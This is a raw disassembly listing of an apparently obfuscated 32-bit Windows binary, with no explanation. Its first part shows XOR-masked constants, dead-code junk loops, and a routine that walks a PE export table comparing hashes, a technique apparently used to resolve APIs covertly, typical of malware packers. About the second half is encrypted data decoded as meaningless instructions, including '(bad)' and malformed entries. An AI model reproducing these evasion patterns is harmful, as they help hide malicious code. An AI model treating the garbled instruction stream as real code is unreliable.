  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	xlat   BYTE PTR ds:[ebx]
  40688d:	fsub   QWORD PTR [ebx-0x7cc2ecf1]
  406893:	or     DWORD PTR [esi+ebx*2],0xffffff83
  406897:	sbb    edi,0x0
  40689a:	rcl    BYTE PTR [eax+eax*2+0x731560fe],cl
  4068a1:	sub    BYTE PTR [edx-0x63ae27f6],0x35
  4068a8:	lock or DWORD PTR [ebp+0x70],esp
  4068ac:	mov    bl,0xf3
  4068ae:	icebp  
  4068af:	fld    DWORD PTR [eax-0x5e]
  4068b2:	jp     0x4068ac
  4068b4:	or     al,bh
  4068b6:	sbb    eax,0xc57075c3
  4068bb:	je     0x4068c4
  4068bd:	jno    0x4068af
  4068bf:	test   al,0xdc
  4068c1:	xchg   ebp,eax
  4068c2:	cs js  0x4068f0
  4068c5:	mov    ebp,0x4c009fc8
  4068ca:	mov    ebx,0xe424e014
  4068cf:	popa   
  4068d0:	shl    DWORD PTR [esi+0x1774f52a],1
  4068d6:	push   0xffffff8a
  4068d8:	xchg   edi,eax
  4068d9:	add    BYTE PTR [ebx],ah
  4068db:	pop    ebx
  4068dc:	out    0x1d,eax
  4068de:	ss sahf 
  4068e0:	imul   edx,DWORD PTR [esi+0x16],0x444442a0
  4068e7:	je     0x4068c2
  4068e9:	rol    eax,0x7c
  4068ec:	js     0x4068c7
  4068ee:	sbb    dl,dl
  4068f0:	es test eax,0xf50aec19
  4068f6:	push   edx
  4068f7:	int    0x36
  4068f9:	mov    ah,0xa9
  4068fb:	popf   
  4068fc:	sbb    edi,edx
  4068fe:	es sbb ecx,eax
  406901:	xchg   ecx,eax
  406902:	and    al,BYTE PTR ds:0x632901b9
  406908:	push   cs
  406909:	cld    
  40690a:	lock imul ebp,esi,0xffffffae
  40690e:	(bad)  
  40690f:	cld    
  406910:	mov    ecx,0xefb06723
  406915:	loope  0x406925
  406917:	pop    esi
  406918:	pop    es
  406919:	scas   al,BYTE PTR es:[edi]
  40691a:	pop    ecx
  40691b:	(bad)  
  40691c:	sar    BYTE PTR [ecx],0x53
  40691f:	xchg   ebp,eax
  406920:	jecxz  0x4068c6
  406922:	inc    esp
  406923:	mov    ebx,0x8262256c
  406928:	popa   
  406929:	or     dl,ch
  40692b:	pop    ds
  40692c:	dec    eax
  40692d:	lock and al,0xa1
  406930:	fisttp QWORD PTR [ecx-0xb9769de]
  406936:	dec    si
  406938:	repz xchg ebp,eax
  40693a:	fst    DWORD PTR [eax-0x69]
  40693d:	pop    ecx
  40693e:	sub    ebp,edi
  406940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406941:	pop    eax
  406942:	repz pop ss
  406944:	lahf   
  406945:	scas   al,BYTE PTR es:[edi]
  406946:	scas   al,BYTE PTR es:[edi]
  406947:	or     cl,BYTE PTR gs:[esp+ecx*4+0x715916b7]
  40694f:	icebp  
  406950:	mov    ds:0x826e88e1,eax
  406955:	xor    edi,0xc7ef5b6e
  40695b:	push   ebp
  40695c:	sub    cl,cl
  40695e:	jl     0x40693c
  406960:	imul   edx,DWORD PTR [ecx+0x5b],0x30
  406964:	and    al,0xa5
  406966:	push   esp
  406967:	push   ss
  406968:	out    dx,al
  406969:	mov    WORD PTR [ecx],gs
  40696b:	scas   eax,DWORD PTR es:[edi]
  40696c:	fs hlt 
  40696e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696f:	and    BYTE PTR [edi],cl
  406971:	xchg   edi,eax
  406972:	pop    ds
  406973:	shr    DWORD PTR [edi+0x10],0xa6
  406977:	dec    edx
  406978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406979:	push   0xffffffe1
  40697b:	or     BYTE PTR [eax-0x4b],dh
  40697e:	mov    ds,WORD PTR [edi-0x4ed3935]
  406984:	enter  0xa189,0x29
  406988:	add    al,0xe7
  40698a:	(bad)  
  40698e:	je     0x406991
  406990:	nop
  406991:	sar    esi,0xe7
  406994:	jmp    0xbc90:0xca788fd4
  40699b:	adc    BYTE PTR [esi-0x59ea4f6c],bh
  4069a1:	icebp  
  4069a2:	jb     0x406947
  4069a4:	jnp    0x406937
  4069a6:	and    DWORD PTR [esi+0x59],0x59
  4069aa:	ficomp DWORD PTR [edi+0x165da723]
  4069b0:	sar    DWORD PTR [eax],cl
  4069b2:	cmp    BYTE PTR [ecx+eiz*4-0x5ffc6979],bh
  4069b9:	xor    BYTE PTR [ebx-0x65],ah
  4069bc:	clc    
  4069bd:	xor    esp,DWORD PTR ds:0x2145dfb4
  4069c3:	inc    edi
  4069c4:	ins    BYTE PTR es:[edi],dx
  4069c5:	es xchg edx,eax
  4069c7:	stos   DWORD PTR es:[edi],eax
  4069c8:	aad    0x4e
  4069ca:	dec    edi
  4069cb:	mov    esi,0x24e04783
  4069d0:	aaa    
  4069d1:	xlat   BYTE PTR ds:[ebx]
  4069d2:	jns    0x406a2c
  4069d4:	sub    eax,0x3716c6b3
  4069d9:	(bad)  
  4069da:	fild   WORD PTR cs:[ecx]
  4069dd:	mov    ah,0xa3
  4069df:	and    DWORD PTR [ecx+0x25acf567],esp
  4069e5:	imul   eax,edi,0xd0df608
  4069eb:	cdq    
  4069ec:	loopne 0x4069e8
  4069ee:	frstor [eax-0x47]
  4069f1:	lea    edx,[edi-0x41]
  4069f4:	mov    bh,0x88
  4069f6:	push   ecx
  4069f7:	lahf   
  4069f8:	repnz iret 
  4069fa:	mov    eax,DWORD PTR [ecx+0x5c]
  4069fd:	ret    
  4069fe:	jne    0x4069a8
  406a00:	mov    dh,0x23
  406a02:	and    bl,BYTE PTR [eax-0x40]
  406a05:	mov    ss,esp
  406a07:	jae    0x4069fd
  406a09:	mov    ebx,0xa7fd8124
  406a0e:	(bad)  
  406a0f:	fiadd  WORD PTR [esi-0x76]
  406a12:	cli    
  406a13:	sub    dl,ah
  406a15:	into   
  406a16:	push   edi
  406a17:	mov    ecx,0xb8d13f66
  406a1c:	call   0x3fc6:0x4f0b9e9
  406a23:	out    0x79,eax
  406a25:	sar    BYTE PTR [ebx+0x28],cl
  406a28:	and    eax,0x767b3aa3
  406a2d:	sub    al,0xb2
  406a2f:	fidivr DWORD PTR [esi-0x4e5e9bac]
  406a35:	and    al,0x79
  406a37:	lods   eax,DWORD PTR ds:[esi]
  406a38:	ss stos BYTE PTR es:[edi],al
  406a3a:	loope  0x406a1e
  406a3c:	xchg   esp,eax
  406a3d:	repz or cl,BYTE PTR [ebx]
  406a40:	inc    ebp
  406a41:	xchg   esp,eax
  406a42:	int    0x35
  406a44:	push   esp
  406a45:	ins    DWORD PTR es:[edi],dx
  406a46:	push   ecx
  406a47:	pusha  
  406a48:	or     ebp,DWORD PTR [ecx]
  406a4a:	jmp    0x566f:0x3ed4705a
  406a51:	pop    esp
  406a52:	call   0xbd899ac1
  406a57:	mov    eax,0x340f1b18
  406a5c:	lds    eax,FWORD PTR [eax-0x19]
  406a5f:	lods   eax,DWORD PTR ds:[esi]
  406a60:	scas   eax,DWORD PTR es:[edi]
  406a61:	ret    
  406a62:	test   BYTE PTR [esi+0x63],al
  406a65:	int3   
  406a66:	mov    ecx,0x5fdb6a02
  406a6b:	sub    edx,DWORD PTR [edx+edx*4-0x6]
  406a6f:	mov    bl,0x36
  406a71:	imul   edx,DWORD PTR ds:0x4160268c,0xffffff95
  406a78:	pop    ss
  406a79:	push   edx
  406a7a:	in     eax,dx
  406a7b:	es inc ebp
  406a7d:	jno    0x406a43
  406a7f:	imul   ebx,DWORD PTR [ebp+0x2e],0xc4a48599
  406a86:	daa    
  406a87:	or     cl,al
  406a89:	push   ebx
  406a8a:	inc    esp
  406a8b:	mov    al,ds:0x46b944a8
  406a90:	das    
  406a91:	mov    ebp,DWORD PTR [bx-0x80]
  406a95:	jb     0x406a96
  406a97:	jmp    0xf609040d
  406a9c:	adc    DWORD PTR [ecx-0x5a595d22],ebp
  406aa2:	xor    dl,BYTE PTR [edi+ecx*2]
  406aa5:	jge    0x406a74
  406aa7:	cwde   
  406aa8:	push   edx
  406aa9:	in     eax,dx
  406aaa:	add    DWORD PTR [esi+0x1c],edi
  406aad:	jp     0x406a3f
  406aaf:	test   BYTE PTR [esi+0x30],bh
  406ab2:	cmp    BYTE PTR [eax+0xe],0x30
  406ab6:	mov    esi,0x4373564c
  406abb:	iret   
  406abc:	popa   
  406abd:	push   eax
  406abe:	mov    bh,0x75
  406ac0:	jb     0x406b16
  406ac2:	fidiv  DWORD PTR ds:0x746f22fe
  406ac8:	mov    cl,0xeb
  406aca:	xor    al,BYTE PTR ds:0xe60ee630
  406ad0:	cmp    DWORD PTR [ebp+0x53],ebp
  406ad3:	je     0x406ae0
  406ad5:	cmp    BYTE PTR [edx+0x5a974e4],ah
  406adb:	adc    eax,0xf40ef17f
  406ae0:	mov    ?,esi
  406ae2:	add    ah,al
  406ae4:	mov    cl,0x4f
  406ae6:	push   esi
  406ae7:	enter  0x5d01,0xf0
  406aeb:	in     al,0xe1
  406aed:	xor    al,0x39
  406aef:	add    DWORD PTR [ebx],edx
  406af1:	pushf  
  406af2:	push   ecx
  406af3:	cld    
  406af4:	cwde   
  406af5:	or     ecx,ecx
  406af7:	jle    0x406b71
  406af9:	jecxz  0x406b31
  406afb:	jbe    0x406b0c
  406afd:	or     esi,ecx
  406aff:	leave  
  406b00:	xchg   ebp,eax
  406b01:	mov    edx,0x611c701e
  406b06:	push   ebp
  406b07:	adc    edx,DWORD PTR es:[edx-0x67]
  406b0b:	adc    DWORD PTR [ecx],ecx
  406b0d:	or     ebp,DWORD PTR [edi+0x511ec6bc]
  406b13:	into   
  406b14:	js     0x406b5d
  406b16:	mov    bh,ah
  406b18:	push   esi
  406b19:	sti    
  406b1a:	stos   BYTE PTR es:[edi],al
  406b1b:	xlat   BYTE PTR ds:[ebx]
  406b1c:	mov    ebx,0x6a12e476
  406b21:	add    eax,0x4d6484f5
  406b26:	fild   QWORD PTR [ebx+edx*1]
  406b29:	or     eax,0x61c8a740
  406b2e:	adc    BYTE PTR [esi-0x448a2bf8],bh
  406b34:	(bad)
  406b37:	mov    eax,ds:0x1d04eb2f
  406b3c:	jae    0x406ad8
  406b3e:	push   0xffffff92
  406b40:	outs   dx,BYTE PTR ds:[esi]
  406b41:	mov    al,0x3e
  406b43:	jb     0x406adf
  406b45:	inc    DWORD PTR [ebp-0x59]
  406b48:	fwait
  406b49:	mov    bl,0xf0
  406b4b:	sahf   
  406b4c:	loopne 0x406b52
  406b4e:	clc    
  406b4f:	xchg   esi,eax
  406b50:	cmp    BYTE PTR ds:0x9cd1222a,dl
  406b56:	pop    ebx
  406b57:	stos   BYTE PTR es:[edi],al
  406b58:	dec    ebx
  406b59:	mov    ch,0x12
  406b5b:	aas    
  406b5c:	out    dx,eax
  406b5d:	fld    DWORD PTR [ebp+ebx*8+0x22de8384]
  406b64:	mov    ch,0x44
  406b66:	loopne 0x406b4a
  406b68:	ja     0x406b8a
  406b6a:	js     0x406bcf
